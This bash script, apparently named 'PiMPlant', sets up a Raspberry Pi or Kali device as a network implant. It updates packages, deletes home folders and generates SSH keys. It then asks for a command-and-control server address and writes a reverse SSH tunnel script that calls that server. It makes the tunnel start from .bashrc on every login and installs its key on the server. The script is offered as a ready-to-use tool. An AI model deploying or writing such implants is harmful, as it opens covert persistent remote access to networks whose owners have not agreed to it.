#!/bin/bash 
cat << "EOF"
██████╗ ██╗███╗   ███╗██████╗ ██╗      █████╗ ███╗   ██╗████████╗    
██╔══██╗██║████╗ ████║██╔══██╗██║     ██╔══██╗████╗  ██║╚══██╔══╝    
██████╔╝██║██╔████╔██║██████╔╝██║     ███████║██╔██╗ ██║   ██║       
██╔═══╝ ██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══██║██║╚██╗██║   ██║       
██║     ██║██║ ╚═╝ ██║██║     ███████╗██║  ██║██║ ╚████║   ██║       
╚═╝     ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       
                                                                     
███████╗ ██████╗██████╗ ██╗██████╗ ████████╗                         
██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝                         
███████╗██║     ██████╔╝██║██████╔╝   ██║                            
╚════██║██║     ██╔══██╗██║██╔═══╝    ██║                            
███████║╚██████╗██║  ██║██║██║        ██║                            
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝                            
EOF
echo ""
echo "Welcome To The PiMPlant Script!"
sleep 4
echo ""
echo "Let's Update Your Implant"
echo ""
apt-get update -y && apt-get upgrade -y
echo "Removing Unneeded Directories"
rm -rf Videos/
rm -rf Music/
rm -rf Public/
rm -rf Templates/
rm -rf Bookshelf/
echo ""
cd /home/kali/
ssh-keygen
echo "Enter Your C2 Server's IP/Domain"
read C2IP
sleep 2
echo ""
echo "Time For Some Reverse SSH"
sleep 3
touch rev.sh
echo “#!/bin/bash” >> rev.sh
echo "ssh -N -R 2222:localhost:22 root@$C2IP" >> rev.sh
sudo chmod +x rev.sh
chown kali:kali rev.sh
echo "sleep 15 && bash /home/kali/rev.sh" >> /home/pi/.bashrc
ssh-copy-id -i ~/.ssh/id_rsa.pub root@$C2IP
echo "All Is Complete"
sleep 2
echo "Your Implant Is Configured"
sleep 2
echo ""
echo "Reboot for changes to take effect"
